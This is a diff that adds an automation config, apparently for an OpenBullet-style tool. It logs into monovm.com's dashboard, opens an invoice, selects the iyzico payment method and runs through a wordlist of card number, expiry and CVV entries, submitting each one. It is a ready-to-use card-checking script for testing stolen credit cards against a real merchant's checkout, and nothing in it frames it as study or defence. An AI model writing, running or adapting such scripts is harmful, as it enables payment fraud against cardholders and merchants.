@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+    "name": "monovm.com",
+    "author": "One Bullet Development Team",
+    "category": "Default",
+    "use_proxies": false,
+    "use_captchas": false,
+    "use_selenium": true,
+    "cf_bypass": false,
+    "allowed_wordlists": "Custom",
+    "suggested_bots": 5,
+    "additional_info": "None",
+    "version": "1.0.0",
+    "last_modified": "2026-07-07 22:11:34",
+    "max_cpm": 0,
+    "save_empty_captures": false,
+    "continue_custom": false,
+    "save_hits_to_file": false,
+    "proxy_settings": {
+        "needs_proxies": false,
+        "only_socks": false,
+        "only_ssl": false,
+        "ban_after_good": false,
+        "max_uses": 0,
+        "ban_loop": -1
+    },
+    "data_settings": {
+        "allowed_wl_type": "Custom",
+        "urlencode": false,
+        "custom_format": "<CNUM>|<CM>|<CY>|<CVV>",
+        "rules": [
+            "cc"
+        ]
+    },
+    "selenium_settings": {
+        "always_open": true,
+        "always_quit": true,
+        "quit_on_ban_retry": false,
+        "headless": false,
+        "disable_notifications": true,
+        "custom_args": "",
+        "user_agent": "",
+        "use_random_ua": false
+    }
+}
+
+[SCRIPT]
+BLOCK:NAVIGATE url="https://dashboard.monovm.com/" timeout="60" ban_on_timeout="false"
+
+BLOCK:ELEMENTACTION selector_type="NAME" selector="email" action="Input Text" value="9b8ies85ct@xkxkud.com" variable_name="" index="0" recursive="false" is_capture="false"
+
+BLOCK:ELEMENTACTION selector_type="NAME" selector="password" action="Input Text" value="9b8ies85ct@xkxkud.com" variable_name="" index="0" recursive="false" is_capture="false"
+
+BLOCK:ELEMENTACTION selector_type="ID" selector="sign_in_submit" action="Click" value="" variable_name="" index="0" recursive="false" is_capture="false"
+
+BLOCK:NAVIGATE url="https://dashboard.monovm.com/invoices/1522153" timeout="60" ban_on_timeout="false"
+
+BLOCK:ELEMENTACTION selector_type="ID" selector="payment-method-select" action="Select Dropdown" value="iyzico-try" variable_name="" index="0" recursive="false" is_capture="false"
+
+BLOCK:ELEMENTACTION selector_type="ID" selector="payment-method-select-pay-btn" action="Click" value="" variable_name="" index="0" recursive="false" is_capture="false"
+
+BLOCK:ELEMENTACTION selector_type="ID" selector="iyzi-proceed-to-co" action="Click" value="" variable_name="" index="0" recursive="false" is_capture="false"
+
+BLOCK:ELEMENTACTION selector_type="ID" selector="ccname" action="Input Text" value="" variable_name="" index="0" recursive="false" is_capture="false"
+
+BLOCK:ELEMENTACTION selector_type="ID" selector="ccnumber" action="Input Text" value="<CNUM>" variable_name="" index="0" recursive="false" is_capture="false"
+
+BLOCK:ELEMENTACTION selector_type="ID" selector="cccvc" action="Input Text" value="<CVV>" variable_name="" index="0" recursive="false" is_capture="false"
+
+BLOCK:ELEMENTACTION selector_type="ID" selector="ccexp" action="Input Text" value="<CM>" variable_name="" index="0" recursive="false" is_capture="false"
+
+BLOCK:ELEMENTACTION selector_type="ID" selector="ccexp" action="Input Text" value="<CY>" variable_name="" index="0" recursive="false" is_capture="false"
+
+BLOCK:ELEMENTACTION selector_type="ID" selector="iyz-payment-button" action="Click" value="" variable_name="" index="0" recursive="false" is_capture="false"
